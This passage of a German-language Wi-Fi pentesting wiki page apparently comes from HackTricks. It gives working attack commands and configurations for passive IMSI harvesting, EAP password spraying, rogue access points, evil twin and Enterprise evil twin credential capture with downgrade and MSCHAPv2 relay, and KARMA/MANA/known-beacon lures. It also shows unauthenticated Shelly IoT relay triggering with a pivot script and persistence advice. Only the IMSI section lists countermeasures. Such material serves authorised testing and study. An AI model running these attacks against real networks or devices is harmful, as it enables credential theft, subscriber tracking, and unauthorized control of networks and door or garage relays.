- 802.11 association completes to the SSID (often carrier offload SSIDs like FreeWifi_secure, eduroam-like operator realms, etc.).
- Authenticator sends EAP-Request/Identity.
- Vulnerable clients answer EAP-Response/Identity with their permanent identity = IMSI encoded as a 3GPP NAI, prior to any protection.
- Example NAI: 20815XXXXXXXXXX@wlan.mnc015.mcc208.3gppnetwork.org
- Anyone passively listening to RF can read that frame. No 4-way handshake or TLS keying is needed.

Quick PoC: passive IMSI harvesting on EAP‑SIM/AKA networks lacking identity privacy
<details>
<summary>Click to expand</summary>
```bash
# 1) Enable monitor mode
airmon-ng start wlan0

# 2) Optional: lock channel to the target BSS
airodump-ng wlan0mon --essid <SSID>

# 3) Capture 802.1X/EAP frames
# Wireshark display filters:
#   eap || eapol
#   (identity specifically): eap.code == 2 && eap.type == 1
# Kismet: add source wlan0mon; enable 802.1X/EAP views
# tcpdump (pcap capture):
#   tcpdump -i wlan0mon -s 0 -w eapsim_identity.pcap

# 4) Wait for a device to auto-connect to the SSID
# 5) Inspect the first EAP-Response/Identity frame
# Expected: ASCII NAI containing IMSI, e.g.
#   20815XXXXXXXXXX@wlan.mnc015.mcc208.3gppnetwork.org
```
</details>

Hinweise:
- Funktioniert vor einem TLS-Tunnel, wenn die Bereitstellung reines EAP‑SIM/AKA ohne geschützte Identität/Pseudonyme verwendet.
- Der offengelegte Wert ist ein permanenter Identifier, der an die SIM des Abonnenten gebunden ist; das Sammeln ermöglicht langfristige Verfolgung und nachgelagerten Telekommunikationsmissbrauch.

Auswirkungen
- Privatsphäre: persistente Verfolgung von Nutzer/Gerät durch passive Wi‑Fi-Erfassungen an öffentlichen Orten.
- Ermöglicht Telekommunikationsmissbrauch: Mit der IMSI kann ein Angreifer mit SS7/Diameter-Zugriff den Standort abfragen oder versuchen, Anrufe/SMS abzufangen und MFA zu stehlen.

Gegenmaßnahmen / worauf zu achten ist
- Überprüfen Sie, dass Clients anonyme äußere Identitäten (Pseudonyme) für EAP‑SIM/AKA gemäß 3GPP-Empfehlungen (z. B. 3GPP TS 33.402) verwenden.
- Bevorzugen Sie die Tunnelung der Identitätsphase (z. B. EAP‑TTLS/PEAP, das inneres EAP‑SIM/AKA transportiert), sodass die IMSI niemals im Klartext gesendet wird.
- Paketmitschnitte von association/auth dürfen niemals eine unverschlüsselte IMSI in EAP-Response/Identity zeigen.

Verwandt: Ausnutzung der Telekommunikationssignalisierung mit erfassten mobilen Identifikatoren
{{#ref}}
../pentesting-network/telecom-network-exploitation.md
{{#endref}}

### EAP-Bruteforce (password spray)

Wenn vom Client erwartet wird, einen **Benutzernamen und ein Passwort** zu verwenden (beachte, dass **EAP-TLS in diesem Fall nicht gültig** ist), könntest du versuchen, eine **Liste** von **Benutzernamen** (siehe nächsten Abschnitt) und **Passwörtern** zu beschaffen und dann versuchen, den Zugriff per **Bruteforce** mit [**air-hammer**](https://github.com/Wh1t3Rh1n0/air-hammer)**.**
```bash
./air-hammer.py -i wlan0 -e Test-Network -P UserPassword1 -u usernames.txt
```
Du könntest diesen Angriff auch mit `eaphammer` durchführen:
```bash
./eaphammer --eap-spray \
--interface-pool wlan0 wlan1 wlan2 wlan3 wlan4 \
--essid example-wifi \
--password bananas \
--user-list users.txt
```
## Client-Angriffe — Theorie

### Netzwerkauswahl und Roaming

- Das 802.11-Protokoll definiert, wie eine Station einem Extended Service Set (ESS) beitritt, legt jedoch nicht die Kriterien fest, nach denen ein ESS oder ein Access Point (AP) innerhalb desselben ausgewählt wird.
- Stationen können zwischen APs mit derselben ESSID roamen und so die Konnektivität in einem Gebäude oder Bereich aufrechterhalten.
- Das Protokoll verlangt die Authentifizierung der Station gegenüber dem ESS, schreibt jedoch keine Authentifizierung des AP gegenüber der Station vor.

### Preferred Network Lists (PNLs)

- Stationen speichern die ESSID jedes drahtlosen Netzwerks, mit dem sie sich verbinden, in ihrer Preferred Network List (PNL) zusammen mit netzwerkspezifischen Konfigurationsdaten.
- Die PNL wird verwendet, um automatisch Verbindungen zu bekannten Netzwerken herzustellen und verbessert die Benutzererfahrung, indem der Verbindungsprozess vereinfacht wird.

### Passive Scanning

- APs senden periodisch beacon frames aus, die ihre Präsenz und Eigenschaften ankündigen, einschließlich der ESSID des AP, sofern Broadcasting nicht deaktiviert ist.
- Während des passiven Scannens lauschen Stationen auf beacon frames. Wenn die ESSID eines Beacons mit einem Eintrag in der PNL der Station übereinstimmt, kann sich die Station automatisch mit diesem AP verbinden.
- Die Kenntnis der PNL eines Geräts ermöglicht potenziellen Missbrauch, indem man die ESSID eines bekannten Netzwerks imitiert und so das Gerät dazu bringt, sich mit einem rogue AP zu verbinden.

### Active Probing

- Beim aktiven Probing senden Stationen probe requests, um nahegelegene APs und deren Eigenschaften zu entdecken.
- Directed probe requests zielen auf eine bestimmte ESSID ab und helfen so zu erkennen, ob ein bestimmtes Netzwerk in Reichweite ist, selbst wenn es ein hidden network ist.
- Broadcast probe requests haben ein null SSID-Feld und werden an alle nahegelegenen APs gesendet, sodass die Station nach einem beliebigen bevorzugten Netzwerk suchen kann, ohne den Inhalt ihrer PNL preiszugeben.

## Einfacher AP mit Weiterleitung ins Internet

Bevor erklärt wird, wie man komplexere Angriffe durchführt, wird erklärt, **wie** man einfach einen **AP** erstellt und dessen **Traffic** auf ein Interface weiterleitet, das mit dem **Internet** verbunden ist.

Verwende `ifconfig -a`, um zu überprüfen, dass das wlan-Interface für den AP und das Interface, das mit dem Internet verbunden ist, vorhanden sind.

### DHCP & DNS
```bash
apt-get install dnsmasq #Manages DHCP and DNS
```
Erstelle die Konfigurationsdatei `/etc/dnsmasq.conf`:
```ini
interface=wlan0
dhcp-authoritative
dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
server=8.8.8.8
log-queries
log-dhcp
listen-address=127.0.0.1
```
Dann **IPs setzen** und **routes**:
```bash
ifconfig wlan0 up 192.168.1.1 netmask 255.255.255.0
route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1
```
Und dann **starte** dnsmasq:
```bash
dnsmasq -C dnsmasq.conf -d
```
### hostapd
```bash
apt-get install hostapd
```
Erstelle eine Konfigurationsdatei `hostapd.conf`:
```ini
interface=wlan0
driver=nl80211
ssid=MITIWIFI
hw_mode=g
channel=11
macaddr_acl=0
ignore_broadcast_ssid=0
auth_algs=1
wpa=2
wpa_passphrase=mitmwifi123
wpa_key_mgmt=WPA-PSK
wpa_pairwise=CCMP
wpa_group_rekey=86400
ieee80211n=1
wme_enabled=1
```
**Beende störende Prozesse** , aktiviere **monitor mode**, und **starte hostapd**:
```bash
airmon-ng check kill
iwconfig wlan0 mode monitor
ifconfig wlan0 up
hostapd ./hostapd.conf
```
### Weiterleitung und Umleitung
```bash
iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE
iptables --append FORWARD --in-interface wlan0 -j ACCEPT
echo 1 > /proc/sys/net/ipv4/ip_forward
```
## Evil Twin

An evil twin attack nutzt aus, wie WiFi-Clients Netzwerke erkennen und verlässt sich dabei hauptsächlich auf den Netzwerknamen (ESSID), ohne dass die base station (access point) sich gegenüber dem Client authentifizieren muss. Wichtige Punkte sind:

- **Schwierigkeit bei der Unterscheidung**: Geräte haben Schwierigkeiten, zwischen legitimen und rogue access points zu unterscheiden, wenn diese dieselbe ESSID und denselben encryption type verwenden. In der Praxis nutzen Netzwerke häufig mehrere access points mit derselben ESSID, um die Abdeckung nahtlos zu erweitern.
- **Client-Roaming und Verbindungsmanipulation**: Das 802.11-Protokoll ermöglicht Geräten, innerhalb desselben ESS zwischen access points zu wechseln. Angreifer können dies ausnutzen, indem sie ein Gerät dazu verleiten, die Verbindung zur aktuellen base station zu trennen und sich mit einem rogue access point zu verbinden. Dies kann erreicht werden, indem ein stärkeres Signal angeboten wird oder die Verbindung zum legitimen access point gestört wird, z. B. durch deauthentication packets oder jamming.
- **Herausforderungen bei der Durchführung**: Das erfolgreiche Ausführen eines evil twin attack in Umgebungen mit mehreren, gut platzierten access points kann schwierig sein. Das Deauthentifizieren eines einzelnen legitimen access points führt oft dazu, dass das Gerät sich mit einem anderen legitimen access point verbindet, es sei denn, der Angreifer kann alle in der Nähe befindlichen access points deauthentifizieren oder den rogue access point strategisch platzieren.

Du kannst ein sehr einfaches Open Evil Twin erstellen (ohne Möglichkeit, Traffic ins Internet zu routen), indem du:
```bash
airbase-ng -a 00:09:5B:6F:64:1E --essid "Elroy" -c 1 wlan0mon
```
Sie können auch einen Evil Twin mit **eaphammer** erstellen (beachten Sie, dass zum Erstellen von Evil Twins mit **eaphammer** das Interface **NICHT** im **monitor**-Modus sein sollte):
```bash
./eaphammer -i wlan0 --essid exampleCorp --captive-portal
```
Oder Airgeddon verwenden: `Options: 5,6,7,8,9 (inside Evil Twin attack menu).`

![](<../../images/image (1088).png>)

Bitte beachte, dass standardmäßig, wenn ein ESSID im PNL als WPA-geschützt gespeichert ist, das Gerät sich nicht automatisch mit einem Open evil Twin verbindet. Du kannst versuchen, den echten AP per DoS lahmzulegen und hoffen, dass der Benutzer sich manuell mit deinem Open evil Twin verbindet, oder du kannst den echten AP per DoS angreifen und einen WPA Evil Twin verwenden, um den handshake zu erfassen (mit dieser Methode kannst du das Opfer nicht mit dir verbinden lassen, da du den PSK nicht kennst, aber du kannst den handshake erfassen und versuchen, ihn zu cracken).

_Einige OS und AV werden den Benutzer warnen, dass die Verbindung zu einem Open network gefährlich ist..._

### WPA/WPA2 Evil Twin

Du kannst einen **Evil Twin using WPA/2** erstellen und wenn die Geräte so konfiguriert sind, sich mit dieser SSID per WPA/2 zu verbinden, werden sie versuchen, sich zu verbinden. Allerdings brauchst du, um **to complete the 4-way-handshake**, außerdem **know** das **password**, das der Client verwenden wird. Wenn du es **don't know**, wird die **connection won't be completed**.
```bash
./eaphammer -i wlan0 -e exampleCorp -c 11 --creds --auth wpa-psk --wpa-passphrase "mywifipassword"
```
### Enterprise Evil Twin

Um diese Angriffe zu verstehen, empfehle ich, zuvor die kurze [WPA Enterprise explanation](#wpa-enterprise-mgt) zu lesen.

**Verwendung von hostapd-wpe**

`hostapd-wpe` benötigt eine **Konfigurationsdatei** zum Betrieb. Um die Generierung dieser Konfigurationen zu **automatisieren**, kannst du [https://github.com/WJDigby/apd_launchpad](https://github.com/WJDigby/apd_launchpad) verwenden (lade die Python-Datei im Verzeichnis _/etc/hostapd-wpe/_ herunter)
```bash
./apd_launchpad.py -t victim -s PrivateSSID -i wlan0 -cn company.com
hostapd-wpe ./victim/victim.conf -s
```
In der Konfigurationsdatei kannst du viele verschiedene Dinge auswählen wie ssid, channel, user files, cret/key, dh parameters, wpa version und auth...

[**Using hostapd-wpe with EAP-TLS to allow any certificate to login.**](evil-twin-eap-tls.md)

**Verwendung von EAPHammer**
```bash
# Generate Certificates
./eaphammer --cert-wizard

# Launch Attack
./eaphammer -i wlan0 --channel 4 --auth wpa-eap --essid CorpWifi --creds
```
Standardmäßig verwendet EAPHammer folgende authentication methods (beachte GTC als erstes, um plaintext passwords zu erlangen, und anschließend die Nutzung robusterer auth methods):
```
GTC,MSCHAPV2,TTLS-MSCHAPV2,TTLS,TTLS-CHAP,TTLS-PAP,TTLS-MSCHAP,MD5
```
Dies ist die Standardmethode, um lange Verbindungszeiten zu vermeiden. Sie können dem server jedoch auch die Authentifizierungsmethoden vom schwächsten bis zum stärksten angeben:
```
--negotiate weakest
```
Oder du könntest auch verwenden:

- `--negotiate gtc-downgrade` um eine hocheffiziente GTC-Downgrade-Implementierung (plaintext passwords) zu nutzen
- `--negotiate manual --phase-1-methods PEAP,TTLS --phase-2-methods MSCHAPV2,GTC,TTLS-PAP` um manuell die angebotenen Methoden anzugeben (wenn du dieselben Auth-Methoden in derselben Reihenfolge wie die Organisation anbietest, wird der Angriff deutlich schwerer zu entdecken).
- [Find more info in the wiki](http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/)

#### When clients skip RADIUS certificate validation (PEAP/TTLS)

- Wenn Geräte so konfiguriert sind, dass sie "do not validate certificate", wird ein geklonter AP + rogue RADIUS (`eaphammer --cert-wizard --creds --auth wpa-eap`) **NetNTLMv2** (PEAP-MSCHAPv2) oder **cleartext** creds (PEAP-GTC) sammeln. `bettercap` deauth (`wifi.deauth <BSSID>`) offenbart sowohl versteckte SSIDs während Probe-Requests als auch erzwingt Reconnects, es sei denn PMF/802.11w blockiert gefälschte deauth.
- Geknacktes NetNTLMv2 liefert wiederverwendbare Wi‑Fi/AD creds; GTC liefert sofort plaintext.

#### Relaying PEAP-MSCHAPv2 instead of cracking (wpa_sycophant + hostapd-mana)

- Bei Maschinenkonten mit unknackbaren Zufallspasswörtern missbrauche ein **MSCHAPv2 relay**: starte `hostapd-mana` als Evil Twin und leite den MSCHAPv2-Austausch an `wpa_sycophant` weiter, das sich gleichzeitig mit dem legitimen AP verbindet. Ein erfolgreicher Relay gewährt authentifiziertes Wi‑Fi, ohne das Passwort wiederherzustellen.
- Nutze Builds, die das Ziel-Sicherheitsniveau unterstützen (WPA3/PMF erfordert aktuelle hostapd/wpa_supplicant); PMF verhindert deauth-Zwang, also warte auf freiwillige Client-Associations.

**Using Airgeddon**

`Airgeddon` kann zuvor erzeugte Zertifikate verwenden, um EAP-Authentifizierung für WPA/WPA2-Enterprise-Netzwerke anzubieten. Das gefälschte Netzwerk wird das Verbindungsprotokoll auf EAP-MD5 downgraden, sodass es den Benutzer und den MD5 des Passworts **capturen** kann. Später kann der Angreifer versuchen, das Passwort zu cracken.\
`Airggedon` bietet die Möglichkeit eines **kontinuierlichen Evil Twin-Angriffs (noisy)** oder **nur des Erstellens des Evil Attack, bis sich jemand verbindet (smooth).**

![](<../../images/image (936).png>)

### Debugging PEAP and EAP-TTLS TLS tunnels in Evil Twins attacks

_This method was tested in an PEAP connection but as I'm decrypting an arbitrary TLS tunnel this should also works with EAP-TTLS_

In der **Konfiguration** von _hostapd-wpe_ **kommentiere** die Zeile aus, die _**dh_file**_ enthält (von `dh_file=/etc/hostapd-wpe/certs/dh` zu `#dh_file=/etc/hostapd-wpe/certs/dh`)\
Das bewirkt, dass `hostapd-wpe` **Schlüssel mittels RSA** statt DH austauscht, sodass du den Traffic später **decrypten** kannst, wenn du den privaten Server-Schlüssel kennst.

Starte nun den **Evil Twin** wie üblich mit **`hostapd-wpe`** unter dieser modifizierten Konfiguration. Starte außerdem **`wireshark`** in der **Interface**, die den Evil Twin-Angriff durchführt.

Jetzt oder später (wenn du bereits einige Authentication-Intents erfasst hast) kannst du den privaten RSA-Schlüssel zu wireshark hinzufügen unter: `Edit --> Preferences --> Protocols --> TLS --> (RSA keys list) Edit...`

Füge einen neuen Eintrag hinzu und fülle das Formular mit diesen Werten: **IP address = any** -- **Port = 0** -- **Protocol = data** -- **Key File** (**select your key file**, um Probleme zu vermeiden wähle eine Key File **without being password protected**).

![](<../../images/image (687).png>)

Und schau dir den neuen **"Decrypted TLS" tab** an:

![](<../../images/image (231).png>)

## KARMA, MANA, Loud MANA and Known beacons attack

### ESSID and MAC black/whitelists

Verschiedene Typen von Media Access Control Filter Lists (MFACLs) und deren Modi sowie Auswirkungen auf das Verhalten eines rogue Access Point (AP):

1. **MAC-based Whitelist**:
- Der rogue AP antwortet nur auf probe requests von Geräten, die in der Whitelist aufgeführt sind, und bleibt für alle anderen nicht gelistet unsichtbar.
2. **MAC-based Blacklist**:
- Der rogue AP ignoriert probe requests von Geräten auf der Blacklist und ist für genau diese Geräte effektiv unsichtbar.
3. **SSID-based Whitelist**:
- Der rogue AP antwortet nur auf probe requests für spezifische, in der Liste aufgeführte ESSIDs und ist für Geräte unsichtbar, deren Preferred Network Lists (PNLs) diese ESSIDs nicht enthalten.
4. **SSID-based Blacklist**:
- Der rogue AP antwortet nicht auf probe requests für die spezifischen ESSIDs auf der Blacklist und ist für Geräte, die nach diesen Netzwerken suchen, unsichtbar.
```bash
# example EAPHammer MFACL file, wildcards can be used
09:6a:06:c8:36:af
37:ab:46:7a:9a:7c
c7:36:8c:b2:*:*

[--mac-whitelist /path/to/mac/whitelist/file.txt #EAPHammer whitelisting]
[--mac-blacklist /path/to/mac/blacklist/file.txt #EAPHammer blacklisting]
```

```bash
# example ESSID-based MFACL file
name1
name2
name3

[--ssid-whitelist /path/to/mac/whitelist/file.txt]
[--ssid-blacklist /path/to/mac/blacklist/file.txt]
```
### KARMA

Diese Methode ermöglicht es einem **Angreifer, einen bösartigen access point (AP) zu erstellen, der auf alle probe requests** von Geräten antwortet, die versuchen, sich mit Netzwerken zu verbinden. Diese Technik **täuscht Geräte dazu, sich mit dem AP eines Angreifers zu verbinden**, indem sie die Netzwerke nachahmt, nach denen die Geräte suchen. Sobald ein Gerät eine Verbindungsanfrage an diesen rogue AP sendet, wird die Verbindung abgeschlossen, sodass das Gerät fälschlicherweise mit dem Netzwerk des Angreifers verbunden wird.

### MANA

Dann begannen **Geräte, unsichere Netzwerkantworten zu ignorieren**, wodurch die Effektivität des ursprünglichen karma attack abnahm. Allerdings wurde von Ian de Villiers und Dominic White eine neue Methode eingeführt, bekannt als der **MANA attack**. Diese Methode beinhaltet, dass der rogue AP **die Preferred Network Lists (PNL) von Geräten erfasst, indem er auf ihre broadcast probe requests** mit Netzwerknamen (SSIDs) antwortet, die zuvor von den Geräten gespeichert wurden. Dieser ausgeklügelte Angriff umgeht die Schutzmaßnahmen gegen den ursprünglichen karma attack, indem er ausnutzt, wie Geräte bekannte Netzwerke speichern und priorisieren.

Der MANA attack funktioniert, indem er sowohl directed als auch broadcast probe requests von Geräten überwacht. Bei directed requests zeichnet er die MAC address des Geräts und den angeforderten Netzwerknamen auf und fügt diese Informationen einer Liste hinzu. Wenn eine broadcast request empfangen wird, antwortet der AP mit Informationen, die mit einem der Netzwerke auf der Liste des Geräts übereinstimmen, und verleitet das Gerät dazu, sich mit dem rogue AP zu verbinden.
```bash
./eaphammer -i wlan0 --cloaking full --mana --mac-whitelist whitelist.txt [--captive-portal] [--auth wpa-psk --creds]
```
### Loud MANA

Eine **Loud MANA attack** ist eine fortgeschrittene Strategie für Situationen, in denen Geräte kein directed probing verwenden oder ihre Preferred Network Lists (PNL) dem Angreifer unbekannt sind. Sie basiert auf dem Prinzip, dass **Geräte im selben Bereich wahrscheinlich einige Netzwerknamen in ihren PNLs teilen**. Anstatt selektiv zu antworten, sendet dieser Angriff probe responses für jeden Netzwerknamen (ESSID), der in den kombinierten PNLs aller beobachteten Geräte gefunden wird. Dieser breit angelegte Ansatz erhöht die Wahrscheinlichkeit, dass ein Gerät ein bekanntes Netzwerk erkennt und versucht, sich mit dem rogue Access Point (AP) zu verbinden.
```bash
./eaphammer -i wlan0 --cloaking full --mana --loud [--captive-portal] [--auth wpa-psk --creds]
```
### Known Beacon attack

Wenn die **Loud MANA attack** nicht ausreicht, bietet die **Known Beacon attack** einen alternativen Ansatz. Diese Methode **brute-forces den Verbindungsprozess, indem sie einen AP simuliert, der auf beliebige Netzwerknamen reagiert und eine Liste potenzieller ESSIDs** aus einer Wortliste durchläuft. Das simuliert die Anwesenheit zahlreicher Netzwerke in der Hoffnung, eine ESSID in der PNL des Opfers zu treffen, wodurch ein Verbindungsversuch zum gefälschten AP ausgelöst wird. Die Attacke lässt sich verstärken, indem man sie mit der Option `--loud` kombiniert, um einen aggressiveren Versuch zu unternehmen, Geräte anzulocken.

Eaphammer implementierte diese Attacke als MANA attack, bei der alle ESSIDs in einer Liste ausgesendet werden (du könntest dies auch mit `--loud` kombinieren, um eine Loud MANA + Known beacons attack zu erstellen):
```bash
./eaphammer -i wlan0 --mana [--loud] --known-beacons  --known-ssids-file wordlist.txt [--captive-portal] [--auth wpa-psk --creds]
```
**Known Beacon Burst attack**

The **Known Beacon Burst attack** involves **schnelles Senden von beacon frames für jede in einer Datei aufgeführte ESSID**. Dies erzeugt eine dichte Umgebung gefälschter Netzwerke, wodurch die Wahrscheinlichkeit, dass Geräte sich mit dem rogue AP verbinden, erheblich steigt — besonders in Kombination mit einer MANA attack. Diese Technik nutzt Geschwindigkeit und Menge, um die Netzwerkauswahlmechanismen der Geräte zu überlasten.
```bash
# transmit a burst of 5 forged beacon packets for each entry in list
./forge-beacons -i wlan1 \
--bssid de:ad:be:ef:13:37 \
--known-essids-file known-s.txt \
--dst-addr 11:22:33:11:22:33 \
--burst-count 5
```
## Wi-Fi Direct

**Wi-Fi Direct** ist ein Protokoll, das es Geräten ermöglicht, sich direkt per Wi‑Fi zu verbinden, ohne einen traditionellen wireless access point zu benötigen. Diese Fähigkeit ist in verschiedenen Internet of Things (IoT) Geräten integriert, wie Druckern und Fernsehern, und erleichtert die direkte Kommunikation Gerät‑zu‑Gerät. Ein bemerkenswertes Merkmal von Wi‑Fi Direct ist, dass ein Gerät die Rolle eines access point übernimmt, bekannt als group owner, um die Verbindung zu verwalten.

Security for Wi‑Fi Direct connections is established through **Wi‑Fi Protected Setup (WPS)**, which supports several methods for secure pairing, including:

- **Push-Button Configuration (PBC)**
- **PIN entry**
- **Near-Field Communication (NFC)**

Diese Methoden, besonders PIN entry, sind anfällig für dieselben Schwachstellen wie WPS in traditionellen Wi‑Fi Netzwerken und damit Ziel ähnlicher Angriffsvektoren.

### EvilDirect Hijacking

**EvilDirect Hijacking** ist ein speziell auf Wi‑Fi Direct gerichteter Angriff. Er spiegelt das Konzept eines Evil Twin‑Angriffs wider, zielt jedoch auf Wi‑Fi Direct Verbindungen. Dabei gibt sich ein Angreifer als legitimer group owner aus, um Geräte dazu zu bringen, sich mit einer bösartigen Instanz zu verbinden. Diese Methode kann mit Tools wie `airbase-ng` ausgeführt werden, indem Kanal, ESSID und MAC address des nachgeahmten Geräts angegeben werden:

## Persistenz des Commissioning AP & dual-homed IoT pivoting (Shelly Gen4‑Fall)

Einige Consumer IoT Relais/Controller lassen den Commissioning **open AP** nach dem Beitritt zum IoT WLAN aktiv (z. B. Shelly Gen4 SSIDs, die mit `Shelly` beginnen). Das Gerät bleibt **dual-homed**: eine AP‑Schnittstelle mit Standard‑IP `192.168.33.1` sowie eine Client‑Schnittstelle im internen WLAN.

**Abuse flow (Wi‑Fi proximity required):**

1. Mit dem provisioning AP verbinden, eine DHCP‑Lease erhalten und die **AP-side HTTP API** durchsuchen.
2. Relais über nicht‑authentifizierte Endpunkte auslösen, z. B. `http://192.168.33.1/relay/0?turn=on` (Auswirkung auf Tür/Tor/Garage). Firmware‑Upload‑Endpunkte können Persistenz hinzufügen.
3. Als **pivot** verwenden: Shelly‑Scripting kann HTTP von der internen Schnittstelle an andere LAN‑Hosts senden. Beispielpivot zu einem anderen Shelly unter `10.0.98.221`:
```javascript
Shelly.addEventHandler(function (event) {
if (event.component === "switch:0" && event.info.state) {
Shelly.call("HTTP.GET", { url: "http://10.0.98.221/light/0?turn=on" });
}
});
```
Ersetze die URL durch jedes erreichbare interne HTTP‑Ziel; dual‑homing vermeidet zusätzlichen Routing/NAT‑Aufwand.
4. Im großen Maßstab: Vendor‑SSIDs auf **wigle.net** abfragen (z. B. `Shelly`), um Commissioning‑APs für Vor‑Ort‑Exploitation zu finden.

Für Persistenz die Commissioning‑AP aktiviert lassen.

## Referenzen

- [https://www.pentestpartners.com/security-blog/shelly-iot-door-controller-config-fail-leaving-your-garage-home-and-security-exposed/](https://www.pentestpartners.com/security-blog/shelly-iot-door-controller-config-fail-leaving-your-garage-home-and-security-exposed/)
- [https://posts.specterops.io/modern-wireless-attacks-pt-i-basic-rogue-ap-theory-evil-twin-and-karma-attacks-35a8571550ee](https://posts.specterops.io/modern-wireless-attacks-pt-i-basic-rogue-ap-theory-evil-twin-and-karma-attacks-35a8571550ee)
- [https://posts.specterops.io/modern-wireless-attacks-pt-ii-mana-and-known-beacon-attacks-97a359d385f9](https://posts.specterops.io/modern-wireless-attacks-pt-ii-mana-and-known-beacon-attacks-97a359d385f9)
- [https://posts.specterops.io/modern-wireless-tradecraft-pt-iii-management-frame-access-control-lists-mfacls-22ca7f314a38](https://posts.specterops.io/modern-wireless-tradecraft-pt-iii-management-frame-access-control-lists-mfacls-22ca7f314a38)
- [https://posts.specterops.io/modern-wireless-tradecraft-pt-iv-tradecraft-and-detection-d1a95da4bb4d](https://posts.specterops.io/modern-wireless-tradecraft-pt-iv-tradecraft-and-detection-d1a95da4bb4d)
- [https://github.com/gdssecurity/Whitepapers/blob/master/GDS%20Labs%20-%20Identifying%20Rogue%20Access%20Point%20Attacks%20Using%20Probe%20Response%20Patterns%20and%20Signal%20Strength.pdf](https://github.com/gdssecurity/Whitepapers/blob/master/GDS%20Labs%20-%20Identifying%20Rogue%20Access%20Point%20Attacks%20Using%20Probe%20Response%20Patterns%20and%20Signal%20Strength.pdf)
- [http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/](http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/)
- [https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/](https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/)
- [https://medium.com/hacking-info-sec/ataque-clientless-a-wpa-wpa2-usando-pmkid-1147d72f464d](https://medium.com/hacking-info-sec/ataque-clientless-a-wpa-wpa2-usando-pmkid-1147d72f464d)
- [https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-(Offline-WPS-Attack)](<https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-(Offline-WPS-Attack)>)
- [https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/](https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/)
- [The vulnerability that killed FreeWifi_Secure](https://7h30th3r0n3.fr/the-vulnerability-that-killed-freewifi_secure/)
- [RFC 4186 – EAP-SIM Authentication](https://datatracker.ietf.org/doc/html/rfc4186)
- [3GPP TS 33.402 – 3GPP system architecture evolution (SAE); Security aspects of non-3GPP accesses](https://www.3gpp.org/ftp/Specs/archive/33_series/33.402/)
- [Wireless-(in)Fidelity: Pentesting Wi-Fi in 2025 (Synacktiv)](https://www.synacktiv.com/en/publications/wireless-infidelity-pentesting-wi-fi-in-2025.html)
- [PEAP relay attacks with wpa_sycophant (SensePost)](https://sensepost.com/blog/2019/peap-relay-attacks-with-wpa_sycophant/)


TODO: Schau dir [https://github.com/wifiphisher/wifiphisher](https://github.com/wifiphisher/wifiphisher) an (Login mit Facebook und Nachahmung von WPA in captive portals)

{{#include ../../banners/hacktricks-training.md}}
